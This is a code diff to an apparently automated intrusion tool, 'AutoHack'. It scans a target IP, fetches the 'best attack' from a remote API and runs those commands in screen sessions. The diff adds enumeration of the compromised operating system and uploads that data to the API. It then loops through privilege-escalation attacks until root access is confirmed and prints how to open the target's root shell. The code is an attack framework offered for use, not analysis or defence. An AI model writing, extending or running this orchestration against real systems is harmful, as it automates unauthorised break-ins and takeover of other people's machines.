@@ -33,9 +33,10 @@ class Colors:
 
 
 class SuccessStatus:
-    EXPLOIT_UNSUCCESSFUL = 'EXPLOIT_UNSUCCESSFUL'
-    EXPLOIT_SUCCESSFUL = 'EXPLOIT_SUCCESSFUL'
-    PRIVILEGE_ESCALATE_SUCCESSFUL = 'PRIVILEGE_ESCALATE_SUCCESSFUL'
+    EXPLOIT_NETWORK_UNSUCCESSFUL = 'EXPLOIT_NETWORK_UNSUCCESSFUL'
+    EXPLOIT_NETWORK_SUCCESSFUL = 'EXPLOIT_NETWORK_SUCCESSFUL'
+    EXPLOIT_OS_UNSUCCESSFUL = 'EXPLOIT_OS_UNSUCCESSFUL'
+    EXPLOIT_OS_SUCCESSFUL = 'EXPLOIT_OS_SUCCESSFUL'
 
 
 class Utils:
@@ -259,9 +260,9 @@ class ProcessReference:
 
 class ProcessManager:
     def __init__(
-        self,
-        verbose: bool,
-        time_between_heart_beats: int,
+            self,
+            verbose: bool,
+            time_between_heart_beats: int,
     ):
         self.processes: List[ProcessReference] = []
         self.verbose = verbose
@@ -399,10 +400,10 @@ class AutoHack:
     api_key = os.getenv('AUTOHACK_API_KEY') or 'FREE'
 
     def __init__(
-        self, ip_address, attacker_ip_address, output_directory=None, config_directory=None,
-        port_scan_type=None, nmap_extra=None, ports=None,
-        use_processes=None, verbose=None, command_timeout=None,
-        heart_beat_time=None, retry_max=None, professional=None
+            self, ip_address, attacker_ip_address, output_directory=None, config_directory=None,
+            port_scan_type=None, nmap_extra=None, ports=None,
+            use_processes=None, verbose=None, command_timeout=None,
+            heart_beat_time=None, retry_max=None, professional=None
     ) -> None:
         AutoHack.command_timeout = command_timeout
         self.process_lock = Utils.get_lock()
@@ -431,6 +432,7 @@ class AutoHack:
         port_scan_config_file = os.path.join(config_directory, 'port-scans.toml')
         services_scan_config_file = os.path.join(config_directory, 'service-scans.toml')
         universal_pattern_config_file = os.path.join(config_directory, 'universal-patterns.toml')
+        os_discovery_config_file = os.path.join(config_directory, 'os-discovery.toml')
 
         if not os.path.isfile(port_scan_config_file):
             raise Utils.AutoHackException(f'Can Not Find Port Scan Config File inside: {config_directory} Directory')
@@ -438,10 +440,13 @@ class AutoHack:
             raise Utils.AutoHackException(f'Can Not Find Services Scan Config File: {config_directory} Directory')
         if not os.path.isfile(universal_pattern_config_file):
             raise Utils.AutoHackException(f'Can Not Find Universal Pattern Config File: {config_directory} Directory')
+        if not os.path.isfile(os_discovery_config_file):
+            raise Utils.AutoHackException(f'Can Not Find Os Discovery Config File: {config_directory} Directory')
 
         self.port_scan_config = toml.load(port_scan_config_file)
         self.services_scan_config = toml.load(services_scan_config_file)
         self.universal_patterns = [value for value in toml.load(universal_pattern_config_file).values()]
+        self.os_discovery_config = toml.load(os_discovery_config_file)
 
         self.scan_directory = os.path.join(output_directory, 'scans')
         xml_directory = os.path.join(self.scan_directory, 'xml')
@@ -466,7 +471,7 @@ class AutoHack:
         self.session_id: str | None = None
         self.spearhead_index_unique_id: str | None = None
         self.expected_command_answers_to_verify_root_access: dict = {}
-        self.success_status = SuccessStatus.EXPLOIT_UNSUCCESSFUL
+        self.success_status = SuccessStatus.EXPLOIT_NETWORK_UNSUCCESSFUL
         Utils.clear_file(self.exploit_steps_log)
 
     def get_config(self, config_directory: str):
@@ -500,9 +505,9 @@ class AutoHack:
         ]
 
         possible_config_directories_locations = [
-            local_config_directory,
-            global_config_directory
-        ] + site_packages_autohack_directories
+                                                    local_config_directory,
+                                                    global_config_directory
+                                                ] + site_packages_autohack_directories
 
         for prospective_directory in possible_config_directories_locations:
             if self.verbose:
@@ -861,31 +866,6 @@ class AutoHack:
 
             self.log_detected_services()
 
-    def enumerate(self) -> None:
-        """
-        Does primary enumeration based on scans in the
-        service-scans.toml in config folder and user-selected scan type
-        :return:
-        """
-        Utils.print_time()
-        print('\n')
-
-        port_scan_data = {
-            'nmap_extra': self.nmap_extra,
-            'scandir': self.scan_directory,
-            'target_address': self.target_address,
-            'ports': self.ports,
-        }
-
-        for scan_name, scan in self.port_scan_config[self.port_scan_type].items():
-            for sub_scan in scan.values():
-                command = sub_scan['command']
-                self.execute_primary_enumerate_command(
-                    command, port_scan_data
-                )
-
-        self.process_manager.wait_until_pending_processes_have_completed()
-
     def upload_enumeration_files(self):
         """
         Uploads enumeration file and receives the session_id from the api
@@ -920,6 +900,10 @@ class AutoHack:
         response_data = response.json()
         self.session_id = response_data['session_id']
 
+    @staticmethod
+    def get_screen_log_file(unique_screen_name: str):
+        return f"/tmp/log_{unique_screen_name}.txt"
+
     def get_best_attack(self) -> dict:
         """
         Requests the current best attack from the Api
@@ -933,6 +917,28 @@ class AutoHack:
         response_data = response.json()
         return response_data
 
+    def get_best_os_attack(self) -> dict:
+        """
+        Requests the current best attack from the Api
+        """
+        headers = {
+            'API_KEY': self.api_key,
+            'session_id': self.session_id,
+        }
+        url = f'{self.api_source}/get-best-os-attack'
+        response = requests.post(url, headers=headers)
+        response_data = response.json()
+        return response_data
+
+    def kill_preexisting_screens(self):
+        """
+        Kills all preexisting screens so they will
+        not interfere with new screens
+        :return:
+        """
+        command = 'pkill screen'
+        self.run_command(command, False)
+
     def execute_attack(self, attack: dict):
         """
             Runs commands in attack via screen. Some commands
@@ -943,7 +949,10 @@ class AutoHack:
         vul_name = attack['attack_commands']['vulnerability_name'].strip()
         spearhead_index = attack['attack_commands']['meta']['spearhead_index']
 
-        print(f'{Colors.CYAN}RUNNING ATTACK COMMANDS FOR:{Colors.END} {vul_name}:\n')
+        print(f'\n{Colors.CYAN}RUNNING ATTACK COMMANDS FOR:{Colors.END} {vul_name}:\n')
+
+        # stop the preexisting attack
+        self.kill_preexisting_screens()
 
         for index, command in enumerate(commands):
             unique_screen_name = str(uuid.uuid4())
@@ -957,7 +966,12 @@ class AutoHack:
             with open(command_file_path, "w") as file:
                 file.write(command)
 
-            screen_command = f'screen -dmS {unique_screen_name} bash -c "$(cat {command_file_path})"'
+            log_file_path = self.get_screen_log_file(unique_screen_name)
+            screen_command = (
+                f'screen -dmS {unique_screen_name} '
+                f'-L -Logfile "{log_file_path}" '
+                f'bash -c "$(cat {command_file_path})"'
+            )
 
             target = self.run_command
             arguments = (screen_command, False)
@@ -981,7 +995,43 @@ class AutoHack:
             # remove command file to clean up directory
             os.remove(command_file_path)
 
-    def attack_is_successful(self, attack) -> bool:
+    def execute_os_attack(self, attack: dict):
+        """
+            Runs commands in attack via screen. Some commands
+            may block subsequent commands.
+        """
+        vul_name = attack['vulnerability_name'].strip()
+        commands = attack['exploit_commands'].get('commands', [])
+        command_keys = attack['exploit_commands'].get('keys', [])
+        delay_seconds_between_commands = .5
+
+        print(f'{Colors.CYAN}RUNNING OS ATTACK COMMANDS FOR:{Colors.END} {vul_name}:\n')
+
+        for index in range(len(commands)):
+            command = commands[index]
+            key = command_keys[index]
+
+            tmp_command_file_path = '/tmp/execute_os_path_tmp_file.txt'
+            with open(tmp_command_file_path, "w") as file:
+                file.write(command)
+
+            time_before_command = int(time.time())
+            command_printed = (
+                f"\tOS EXPLOIT COMMAND-{index} [at {time_before_command}]\n"
+                f"\t\t{Colors.GREEN}{command}{Colors.END}\n"
+            )
+            print(command_printed)
+
+            if key == 'spearhead':
+                screen_command = (
+                    f'screen -S {self.spearhead_index_unique_id} -X stuff "$(cat {tmp_command_file_path})\n"'
+                )
+                self.run_command(screen_command, False)
+
+                # delay so command will run
+                time.sleep(delay_seconds_between_commands)
+
+    def attack_is_successful(self, delay_seconds: int = 10) -> bool:
         """
             Examines main attack screen output to see if attack was successful.
             * Creates file with screen contents
@@ -992,7 +1042,7 @@ class AutoHack:
         print(message)
 
         # slow execution to ensure attack ran
-        time.sleep(2)
+        time.sleep(delay_seconds)
 
         output_file_path = os.path.join(self.exploit_directory, f'{self.spearhead_index_unique_id}.txt')
         grab_screen_command = f"screen -r {self.spearhead_index_unique_id} -X hardcopy {output_file_path}"
@@ -1024,14 +1074,14 @@ class AutoHack:
             best_attack = self.get_best_attack()
             if not best_attack['should_continue']:
                 self.should_kill_heart_beat = True
-                print('\n\nNo Exploit Discovered: Ending Program')
+                print('\n\nNo Exploit Discovered')
                 break
 
             self.execute_attack(best_attack)
-            if self.attack_is_successful(best_attack):
+            if self.attack_is_successful():
                 message = f"\t{Colors.GREEN}{Colors.BOLD}ATTACK SUCCESSFUL{Colors.END} [at {int(time.time())}]\n"
                 print(message)
-                self.success_status = SuccessStatus.EXPLOIT_SUCCESSFUL
+                self.success_status = SuccessStatus.EXPLOIT_NETWORK_SUCCESSFUL
                 break
 
     def get_is_user_root_commands(self) -> dict:
@@ -1059,31 +1109,18 @@ class AutoHack:
             expected_output_when_root = data['answer']
             command_wait_time_in_seconds = data['wait']
 
-            verify_command = f'screen -S {self.spearhead_index_unique_id} -X stuff "{key_command}"'
-            self.run_command(verify_command, False)
-
-            # delay so command will run
-            time.sleep(command_wait_time_in_seconds)
-
-            output_file_path = os.path.join(
-                self.priv_directory,
-                f'{self.spearhead_index_unique_id}.txt'
+            tmp_command_file_path = '/tmp/user_is_root.txt'
+            self.run_command_and_grab_new_content(
+                screen_index=self.spearhead_index_unique_id,
+                command=key_command,
+                output_file_path=tmp_command_file_path,
+                screen_log_update_seconds=command_wait_time_in_seconds,
             )
 
-            # use the current output file size so we can get the newly written content
-            output_filesize_before_running_command = 0
-            if os.path.exists(output_file_path):
-                output_filesize_before_running_command = os.path.getsize(output_file_path)
-
-            grab_screen_command = f"screen -r {self.spearhead_index_unique_id} -X hardcopy {output_file_path}"
-            self.run_command(grab_screen_command, False)
-
-            output_file_handle = open(output_file_path, 'r')
-            output_file_handle.seek(output_filesize_before_running_command)
-            output_produced_by_command = output_file_handle.read()
+            output_produced_by_command = open(tmp_command_file_path, 'r').read()
 
             if expected_output_when_root in output_produced_by_command:
-                self.success_status = SuccessStatus.PRIVILEGE_ESCALATE_SUCCESSFUL
+                self.success_status = SuccessStatus.EXPLOIT_OS_SUCCESSFUL
                 return True
 
         return False
@@ -1102,15 +1139,12 @@ class AutoHack:
         )
         print(message)
 
-    def privilege_escalate_repeatedly(self):
+    def check_if_user_is_already_root(self) -> bool:
         """
-            when user is not root
-                -enumerate
-                -repeatedly attack and check for root access
+        Checks if the user has already been root and
+        prints a message for feedback
+        :return:
         """
-        # load the expected root command-answers once
-        self.expected_command_answers_to_verify_root_access = self.get_is_user_root_commands()
-
         message = (
             f'\n\n'
             f'{Colors.CYAN}VERIFYING ROOT ACCESS:{Colors.END}'
@@ -1119,34 +1153,148 @@ class AutoHack:
 
         if self.user_is_root():
             self.print_user_is_root_successful()
-            return
+            return True
         else:
             self.print_user_is_root_unsuccessful()
 
-        # todo: enumerate target os
-        # todo: upload target os enumeration data
+        return False
 
-        # repeatedly exploit and check for root access
+    def run_command_and_grab_new_content(
+            self,
+            screen_index: str,
+            command: str,
+            output_file_path: str,
+            screen_log_update_seconds: int = 15,
+    ):
+        """
+        * Grabs current screen content and determines its length
+        * Runs command
+        * Grabs the screen content after length
+        :return:
+        """
+
+        # get log file size
+        screen_log_file_path = self.get_screen_log_file(screen_index)
+        file_size_before_command_of_interest = os.path.getsize(screen_log_file_path)
+
+        # run the command of interest
+        command_on_screen = f'screen -r {screen_index} -X stuff "{command}\n"'
+        self.run_command(command_on_screen, False)
+        time.sleep(screen_log_update_seconds)
+
+        # read new content from the old starting point
+        screen_log_file_handle = open(screen_log_file_path, 'r')
+        screen_log_file_handle.seek(file_size_before_command_of_interest)
+        content_produced_by_command = screen_log_file_handle.read().rstrip()
+
+        # save new content
+        with open(output_file_path, "w") as file:
+            file.write(content_produced_by_command)
+
+    def determine_primary_os_enumeration(self) -> dict:
+        """
+        Determines the OS, useful available programs, and uses that to determine primary enumeration commands
+        :return:
+        """
+        print(f"\n\t{Colors.MAGENTA}DETECTING OPERATING SYSTEM{Colors.END} [at {int(time.time())}]")
+        files_to_upload = {}
+
+        for s in self.os_discovery_config:
+            for assay in self.os_discovery_config[s]['assay']:
+                command = assay['command']
+                file_name = assay['file_name']
+                output_file_path = os.path.join(self.priv_directory, file_name)
+
+                self.run_command_and_grab_new_content(
+                    self.spearhead_index_unique_id,
+                    command,
+                    output_file_path
+                )
+                file_name_with_extension = os.path.basename(output_file_path)
+                files_to_upload[file_name_with_extension] = open(output_file_path, 'rb').read()
+
+        url = f'{self.api_source}/determine-primary-os-enumeration'
+        headers = {
+            'API_KEY': self.api_key,
+            'session_id': self.session_id,
+        }
+        response = requests.post(url, files=files_to_upload, headers=headers)
+        response_data = response.json()
+
+        detected_os = response_data['os'].title()
+        print(f"\n\t{Colors.MAGENTA}OPERATING SYSTEM DETECTED{Colors.END}: {detected_os} \n\n")
+
+        return response_data
+
+    def run_primary_os_enumeration(self, os_enumeration_commands: dict) -> dict:
+        """
+        * Does primary Os enumeration,
+        * Uploads the result for analysis
+        * Gets Secondary OS enumeration commands
+        :return:
+        """
+        primary_os_enumeration_command = os_enumeration_commands['command']
+        primary_os_enumeration_output_file = os.path.join(
+            self.priv_directory,
+            os_enumeration_commands['file_name']
+        )
+
+        # runs primary enumeration command
+        self.run_command_and_grab_new_content(
+            self.spearhead_index_unique_id,
+            primary_os_enumeration_command,
+            primary_os_enumeration_output_file
+        )
+
+        # uploads result for analysis
+        files_to_upload = {
+            os_enumeration_commands['file_name']: open(primary_os_enumeration_output_file, 'rb').read()
+        }
+        url = f'{self.api_source}/analyze-primary-os-enumeration'
+        headers = {
+            'API_KEY': self.api_key,
+            'session_id': self.session_id,
+        }
+        response = requests.post(url, files=files_to_upload, headers=headers)
+        response_data = response.json()
+        return response_data
+
+    def attack_os_repeatedly(self, max_tries: int = 10):
+        """
+            Repeatedly attack os and check for root access
+        """
+
+        # repeatedly exploits and check for root access
         tries = 0
         while True:
-            # todo: attack
-            if self.user_is_root():
+            # implement code below
+            best_attack = self.get_best_os_attack()
+            if not best_attack['should_continue']:
+                print('\n\nNo OS Exploit Discovered')
                 break
 
-            if tries > 5:
+
+            self.execute_os_attack(best_attack)
+            if self.user_is_root():
+                message = f"\t{Colors.GREEN}{Colors.BOLD}OS ATTACK SUCCESSFUL{Colors.END} [at {int(time.time())}]\n"
+                print(message)
+                self.success_status = SuccessStatus.EXPLOIT_OS_SUCCESSFUL
+                break
+
+            if tries > max_tries:
                 break
 
             tries += 1
 
     def handle_success(self):
-        if self.success_status == SuccessStatus.PRIVILEGE_ESCALATE_SUCCESSFUL:
+        if self.success_status == SuccessStatus.EXPLOIT_OS_SUCCESSFUL:
             message = (
                 f'\n\n\n'
                 f'{Colors.CYAN}{Colors.BOLD}TO ACCESS TARGET ROOT TERMINAL, RUN COMMAND:{Colors.END}\n'
                 f'{Colors.GREEN}{Colors.BOLD}\tscreen -r {self.spearhead_index_unique_id}{Colors.END}'
             )
             print(message)
-        elif self.success_status == SuccessStatus.EXPLOIT_SUCCESSFUL:
+        elif self.success_status == SuccessStatus.EXPLOIT_OS_UNSUCCESSFUL:
             message = (
                 f'\n\n\n'
                 f'{Colors.CYAN}{Colors.BOLD}TO ACCESS TARGET NON-ROOT TERMINAL, RUN COMMAND:{Colors.END}\n'
@@ -1154,7 +1302,32 @@ class AutoHack:
             )
             print(message)
 
-    def exploit(self) -> None:
+    def enumerate_network(self) -> None:
+        """
+        Does primary enumeration based on scans in the
+        service-scans.toml in config folder and user-selected scan type
+        :return:
+        """
+        Utils.print_time()
+        print('\n')
+
+        port_scan_data = {
+            'nmap_extra': self.nmap_extra,
+            'scandir': self.scan_directory,
+            'target_address': self.target_address,
+            'ports': self.ports,
+        }
+
+        for scan_name, scan in self.port_scan_config[self.port_scan_type].items():
+            for sub_scan in scan.values():
+                command = sub_scan['command']
+                self.execute_primary_enumerate_command(
+                    command, port_scan_data
+                )
+
+        self.process_manager.wait_until_pending_processes_have_completed()
+
+    def exploit_network(self) -> None:
         """
         When run in professional mode, code exploits based on
         commands generated by AutoHack's API
@@ -1162,12 +1335,53 @@ class AutoHack:
         """
         if self.professional:
             self.attack_repeatedly()
-
-            if self.success_status == SuccessStatus.EXPLOIT_SUCCESSFUL:
-                self.privilege_escalate_repeatedly()
-                self.handle_success()
-
         AutoHack.should_kill_heart_beat = True
+
+    def enumerate_os(self) -> None:
+        """
+        When run in professional mode, code tries to get root access
+        by first gathering information about OS.
+
+        If user is already root, then this step isn't needed
+        :return:
+        """
+        if self.professional and self.success_status == SuccessStatus.EXPLOIT_NETWORK_SUCCESSFUL:
+            self.success_status = SuccessStatus.EXPLOIT_OS_UNSUCCESSFUL
+            self.expected_command_answers_to_verify_root_access = self.get_is_user_root_commands()
+
+            if self.check_if_user_is_already_root():
+                self.success_status = SuccessStatus.EXPLOIT_OS_SUCCESSFUL
+                return
+
+            print(f"\n\n{Colors.CYAN}ENUMERATING OPERATING SYSTEM:{Colors.END}")
+            # slow execution so previous step can finish
+            time.sleep(10)
+            try:
+                os_enumeration_commands = self.determine_primary_os_enumeration()
+            except (Exception,):
+                raise Utils.AutoHackException(
+                    f'Error Determining Primary OS Enumerating'
+                )
+
+            # run primary os enumeration
+            try:
+                secondary_enumeration = self.run_primary_os_enumeration(os_enumeration_commands)
+                # todo: do secondary enumeration
+            except (Exception,):
+                raise Utils.AutoHackException(
+                    f'Error With Primary OS Enumeration'
+                )
+
+
+    def exploit_os(self) -> None:
+        """
+        When run in professional mode, code exploits os based on
+        commands generated by AutoHack's API
+        :return:
+        """
+        if self.professional and self.success_status == SuccessStatus.EXPLOIT_OS_UNSUCCESSFUL:
+            self.attack_os_repeatedly()
+        self.handle_success()
 
 
 if __name__ == "__main__":
@@ -1175,15 +1389,15 @@ if __name__ == "__main__":
         * Primary Enumeration is based on the:
             -user-selected port scan type
             -service scans in autohack_config.
-            
+
             This creates xml files which are:
                 -(secondary) enumerated
-        
-        
+
+
         * Secondary Enumeration is based on the:
             -xml output from Primary Enumeration
             -service sub-scans in autohack_config.
-            
+
             This creates text files which are:
                 -analyzed for regex patterns
     """
@@ -1267,8 +1481,10 @@ if __name__ == "__main__":
         professional=args.professional
     )
 
-    autohack.enumerate()
-    autohack.exploit()
+    autohack.enumerate_network()
+    autohack.exploit_network()
+    autohack.enumerate_os()
+    autohack.exploit_os()
     autohack.wait_for_all_processes()
 
     print('AutoHack Complete')
